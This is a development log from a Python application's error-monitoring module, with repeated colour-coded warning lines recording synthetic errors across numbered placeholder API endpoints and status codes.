WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.882163Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3618'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m418[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.882253Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3619'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m419[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.882344Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3620'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m420[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.882404Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3621'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m421[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.882458Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3622'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m422[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.882510Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3623'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m423[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.882560Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3624'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m424[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.882611Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3625'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m425[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.882660Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3626'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m426[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.882709Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3627'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m427[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.882758Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3628'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m428[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.882806Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3629'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m429[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.882855Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3630'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m430[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.882905Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3631'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m431[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.882953Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3632'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m432[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.883002Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3633'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m433[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.883050Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3634'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m434[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.883099Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3635'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m435[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.883147Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3636'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m436[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.883196Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3637'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m437[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.883244Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3638'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m438[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.883291Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3639'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m439[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.883339Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3640'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m440[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.883387Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3641'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m441[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.883436Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3642'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m442[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.883538Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3643'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m443[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.883604Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3644'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m444[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.883658Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3645'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m445[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.883709Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3646'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m446[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.883758Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3647'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m447[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.883811Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3648'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m448[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.883860Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3649'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m449[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.883940Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3650'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m450[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.884035Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3651'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m451[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.884097Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3652'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m452[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.884150Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3653'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m453[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.884205Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3654'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m454[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.884255Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3655'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m455[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.884307Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3656'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m456[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.884362Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m74[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3657'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m457[0m
